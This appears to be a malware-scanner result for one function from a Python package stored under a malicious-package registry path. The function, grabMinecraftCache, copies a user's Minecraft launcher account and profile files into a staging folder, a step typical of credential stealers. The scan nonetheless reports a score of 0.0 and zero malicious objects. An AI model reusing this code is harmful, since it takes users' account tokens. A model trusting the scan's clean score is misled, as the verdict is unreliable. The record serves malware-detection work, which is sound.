statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/pythoncoloring/1.2.4/pythoncoloring-1.2.4/pythoncoloring-1.2.4/pythoncoloring/main.py
  contents:
  - name: LogCheckingXO.grabMinecraftCache
    score: 0.0
    code: |-
      def grabMinecraftCache(self):
              minecraft = ntpath.join(self.dir, 'Minecraft')
              os.makedirs(minecraft, exist_ok=True)
              mc = ntpath.join(self.roaming, '.minecraft')
              to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']

              for _file in to_grab:
                  if ntpath.exists(ntpath.join(mc, _file)):
                      shutil.copy2(ntpath.join(mc, _file), minecraft + self.sep + _file)
    tokens: resume load_global ntpath load_attr join load_fast self load_attr dir load_const Minecraft call store_fast minecraft load_global os load_attr makedirs load_fast minecraft load_const INTEGER kw_names exist_ok call pop_top load_global ntpath load_attr join load_fast self load_attr roaming load_const .minecraft call store_fast mc build_list load_const list_extend store_fast to_grab load_fast to_grab get_iter for_iter TO_NUMBER store_fast _file load_global ntpath load_attr exists load_global ntpath load_attr join load_fast mc load_fast _file call call pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER load_global shutil load_attr copy2 load_global ntpath load_attr join load_fast mc load_fast _file call load_fast minecraft load_fast self load_attr sep binary_op + load_fast _file binary_op + call pop_top jump_backward TO_NUMBER end_for return_const None
    hash: 3d0951c3139017ba0b576d8e5c6aceca5132ad0b5b79c8f78828058a46028e13
sources:
  ? .repo_cache/malicious_repos/pypi_malregistry/pythoncoloring/1.2.4/pythoncoloring-1.2.4/pythoncoloring-1.2.4/pythoncoloring/main.py
  : 
